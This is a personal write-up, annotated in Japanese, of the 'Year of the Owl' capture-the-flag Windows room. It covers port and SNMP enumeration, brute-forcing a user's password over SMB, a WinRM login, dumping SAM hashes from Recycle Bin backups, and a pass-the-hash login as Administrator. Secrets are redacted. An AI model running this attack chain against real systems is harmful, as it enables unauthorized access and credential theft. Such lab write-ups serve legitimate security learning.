# Year of the Owl CTF

<URL>

## Enumeration

```shell
TARGET=10.48.128.88
sudo bash -c "echo $TARGET   owl.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack ttl 128
139/tcp   open  netbios-ssn   syn-ack ttl 128
443/tcp   open  https         syn-ack ttl 128
445/tcp   open  microsoft-ds  syn-ack ttl 128
3306/tcp  open  mysql         syn-ack ttl 128
3389/tcp  open  ms-wbt-server syn-ack ttl 128
5985/tcp  open  wsman         syn-ack ttl 128
47001/tcp open  winrm         syn-ack ttl 128
```

```sh
sudo nmap -sV -p80,139,443,445,3306,3389,5985,47001 $TARGET

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

HTTP, SMB, MySQL, RDP, WinRM?

```sh
root@ip-10-48-78-159:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.48.128.88
+ Target Hostname:    owl.thm
+ Target Port:        80
+ Start Time:         2026-02-21 00:07:53 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
+ Retrieved x-powered-by header: PHP/7.4.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ 1707 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2026-02-21 00:07:57 (GMT0) (4 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://10.48.128.88/ ----
+ http://10.48.128.88/aux (CODE:403|SIZE:302)                                                                             
+ http://10.48.128.88/cgi-bin/ (CODE:403|SIZE:302)                                                                        
+ http://10.48.128.88/com1 (CODE:403|SIZE:302)                                                                            
+ http://10.48.128.88/com2 (CODE:403|SIZE:302)                                                                            
+ http://10.48.128.88/com3 (CODE:403|SIZE:302)                                                                            
+ http://10.48.128.88/con (CODE:403|SIZE:302)                                                                             
+ http://10.48.128.88/examples (CODE:503|SIZE:402)                                                                        
+ http://10.48.128.88/index.php (CODE:200|SIZE:252)                                                                       
+ http://10.48.128.88/licenses (CODE:403|SIZE:421)                                                                        
+ http://10.48.128.88/lpt1 (CODE:403|SIZE:302)                                                                            
+ http://10.48.128.88/lpt2 (CODE:403|SIZE:302)                                                                            
+ http://10.48.128.88/nul (CODE:403|SIZE:302)                                                                             
+ http://10.48.128.88/phpmyadmin (CODE:403|SIZE:302)                                                                      
+ http://10.48.128.88/prn (CODE:403|SIZE:302)                                                                             
+ http://10.48.128.88/server-info (CODE:403|SIZE:421)                                                                     
+ http://10.48.128.88/server-status (CODE:403|SIZE:421)                                                                   
+ http://10.48.128.88/webalizer (CODE:403|SIZE:302)
```

## SNMPスキャン

全く何も手掛かりが見つからずウォークスルーを見た。

UDPのSNMPを使う。

コミュニティ文字列をスキャン。このツールは初見。

```sh
$ onesixtyone $TARGET -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp-onesixtyone.txt 
Scanning 1 hosts, 3218 communities
10.48.128.88 [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```

```sh
# システム情報
$ snmpwalk -c openview -v1 $TARGET 1.3.6.1.2.1.1        

iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.2
iso.3.6.1.2.1.1.3.0 = Timeticks: (525727) 1:27:37.27
iso.3.6.1.2.1.1.4.0 = ""
iso.3.6.1.2.1.1.5.0 = STRING: "year-of-the-owl"
iso.3.6.1.2.1.1.6.0 = ""
iso.3.6.1.2.1.1.7.0 = INTEGER: 76
```

```sh
# Windows ローカルアカウント名一覧
$ snmpwalk -c openview -v1 $TARGET 1.3.6.1.4.1.77.1.2.25

iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: "Jareth"
iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"
```

```sh
# 実行中プロセス名
$ snmpwalk -c openview -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2

iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "System Idle Process"
iso.3.6.1.2.1.25.4.2.1.2.4 = STRING: "System"
iso.3.6.1.2.1.25.4.2.1.2.68 = STRING: "Registry"
iso.3.6.1.2.1.25.4.2.1.2.412 = STRING: "smss.exe"
iso.3.6.1.2.1.25.4.2.1.2.528 = STRING: "dwm.exe"
iso.3.6.1.2.1.25.4.2.1.2.572 = STRING: "csrss.exe"
iso.3.6.1.2.1.25.4.2.1.2.640 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.648 = STRING: "csrss.exe"
iso.3.6.1.2.1.25.4.2.1.2.664 = STRING: "wininit.exe"
iso.3.6.1.2.1.25.4.2.1.2.708 = STRING: "winlogon.exe"
iso.3.6.1.2.1.25.4.2.1.2.772 = STRING: "services.exe"
iso.3.6.1.2.1.25.4.2.1.2.788 = STRING: "lsass.exe"
iso.3.6.1.2.1.25.4.2.1.2.864 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.892 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.908 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.916 = STRING: "fontdrvhost.exe"
iso.3.6.1.2.1.25.4.2.1.2.924 = STRING: "fontdrvhost.exe"
iso.3.6.1.2.1.25.4.2.1.2.984 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.1044 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.1228 = STRING: "snmp.exe"
iso.3.6.1.2.1.25.4.2.1.2.1236 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.1252 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.1288 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.1324 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.1384 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.1452 = STRING: "amazon-ssm-agent.exe"
iso.3.6.1.2.1.25.4.2.1.2.1496 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.1508 = STRING: "MsMpEng.exe"
iso.3.6.1.2.1.25.4.2.1.2.1648 = STRING: "LiteAgent.exe"
iso.3.6.1.2.1.25.4.2.1.2.1824 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.1888 = STRING: "spoolsv.exe"
iso.3.6.1.2.1.25.4.2.1.2.1980 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.2024 = STRING: "msdtc.exe"
iso.3.6.1.2.1.25.4.2.1.2.2068 = STRING: "mysqld.exe"
iso.3.6.1.2.1.25.4.2.1.2.2088 = STRING: "httpd.exe"
iso.3.6.1.2.1.25.4.2.1.2.2148 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.2316 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.2596 = STRING: "LogonUI.exe"
iso.3.6.1.2.1.25.4.2.1.2.2984 = STRING: "httpd.exe"
iso.3.6.1.2.1.25.4.2.1.2.3912 = STRING: "NisSrv.exe"
```

## Jareth

Jarethユーザーに注目。

使えるものがSMBとユーザー名しかないのでブルートフォース。時間かかったが成功。

```sh
$ crackmapexec smb $TARGET -u Jareth -p /usr/share/wordlists/rockyou.txt
```

SMBもWinRMも認証可能。

```sh
$ crackmapexec smb $TARGET -u Jareth -p '[REDACTED]'   
SMB         10.48.128.88    445    YEAR-OF-THE-OWL  [*] Windows 10 / Server 2019 Build 17763 (name:YEAR-OF-THE-OWL) (domain:year-of-the-owl) (signing:False) (SMBv1:False)
SMB         10.48.128.88    445    YEAR-OF-THE-OWL  [+] year-of-the-owl\Jareth:[REDACTED] 

$ crackmapexec winrm $TARGET -u Jareth -p '[REDACTED]'
SMB         10.48.128.88    5985   YEAR-OF-THE-OWL  [*] Windows 10 / Server 2019 Build 17763 (name:YEAR-OF-THE-OWL) (domain:year-of-the-owl)
HTTP        10.48.128.88    5985   YEAR-OF-THE-OWL  [*] http://10.48.128.88:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.48.128.88    5985   YEAR-OF-THE-OWL  [+] year-of-the-owl\Jareth:[REDACTED] (Pwn3d!)
```

```sh
*Evil-WinRM* PS C:\Users\Jareth\Desktop> type user.txt
THM{[REDACTED]}
```

## 権限昇格

権限は無し。

```sh
*Evil-WinRM* PS C:\Users\Jareth> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

ゴミ箱

```ps
*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> dir


    Directory: C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak
```

```sh
$ impacket-secretsdump -sam ./sam.bak -system ./system.bak local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:[REDACTED]:::
...
```

winrm で接続成功。

```sh
$ evil-winrm -i 10.48.128.88 -u Administrator -H [REDACTED]
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## 振り返り

- 勉強になることが非常に多いルームだった。
- SNMPもゴミ箱を見るパターンも初見。

## Tags

#tags:Windows #tags:SNMP #tags:snmpwalk
